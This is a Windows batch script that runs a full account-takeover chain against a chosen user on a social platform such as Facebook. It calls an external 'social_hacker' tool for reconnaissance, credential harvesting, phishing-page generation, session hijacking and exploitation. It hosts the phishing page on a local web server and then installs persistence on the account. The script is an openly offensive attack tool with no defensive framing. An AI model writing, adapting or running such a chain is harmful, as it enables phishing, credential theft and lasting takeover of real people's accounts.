@echo off
setlocal enabledelayedexpansion

if "%~1"=="" (
    echo Usage: %0 target platform
    echo Example: %0 testuser facebook
    exit /b 1
)

set TARGET=%1
set PLATFORM=%2
for /f "tokens=2 delims==" %%a in ('wmic os get localdatetime /value') do set "dt=%%a"
set OUTPUT_DIR=results_!dt:~0,8!_!dt:~8,6!

echo [+] Full Attack Chain: %TARGET% (%PLATFORM%)
echo [+] Output directory: %OUTPUT_DIR%
if not exist %OUTPUT_DIR% mkdir %OUTPUT_DIR%

echo [*] Step 1: Reconnaissance
python social_hacker.py recon -t %TARGET% -p %PLATFORM% -o %OUTPUT_DIR%\recon_results.json -v

echo [*] Step 2: Deploying phishing
python social_hacker.py harvest -t %TARGET% -p %PLATFORM% -o %OUTPUT_DIR%\harvested_credentials.json

echo [*] Step 3: Generating phishing template
python social_hacker.py exploit -t %TARGET% -p %PLATFORM% --generate-phish %OUTPUT_DIR%\phishing_%PLATFORM%.html

echo [*] Step 4: Starting phishing server on port 8000
start /B python -m http.server 8000 > %OUTPUT_DIR%\server.log 2>&1

echo [*] Step 5: Waiting for credentials (30 seconds)
timeout /t 30 /nobreak >nul

echo [*] Step 6: Attempting session hijacking
python social_hacker.py hijack -t %TARGET% -p %PLATFORM% -o %OUTPUT_DIR%\hijacked_sessions.json -v

echo [*] Step 7: Exploiting vulnerabilities
python social_hacker.py exploit -t %TARGET% -p %PLATFORM% -x -s -c -o %OUTPUT_DIR%\vulnerabilities.json -v

echo [*] Step 8: Deploying persistence
python modules\persistence.py -p %PLATFORM% -u %TARGET% -P "dummy_password" -b email -s %OUTPUT_DIR%\persistence_config.json

echo [*] Step 9: Stopping phishing server
for /f "tokens=5" %%a in ('netstat -ano ^| findstr :8000 ^| findstr LISTENING') do (
    taskkill /PID %%a /F >nul 2>&1
    echo [*] Phishing server stopped (PID: %%a)
)

echo [+] Attack chain completed!
echo [+] Results saved in: %OUTPUT_DIR%

endlocal
